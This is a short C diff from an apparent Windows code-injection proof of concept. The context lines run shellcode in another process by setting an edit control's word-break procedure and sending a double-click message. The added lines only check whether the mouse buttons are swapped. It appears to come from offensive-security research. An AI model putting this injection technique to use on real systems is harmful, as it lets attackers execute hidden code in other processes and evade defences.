@@ -555,6 +555,10 @@ BOOL em_inject(void) {
         printf("  [+] Setting EM_SETWORDBREAKPROC to shellcode at %p\n", embuf.p);
         SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)embuf.p);
    
+        if(GetSystemMetrics(SM_SWAPBUTTON)) {
+          printf("  [+] Mouse buttons are swapped.\n");
+        }
+        
         printf("  [+] Executing shellcode with WM_LBUTTONDBLCLK.\n");
         SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
         
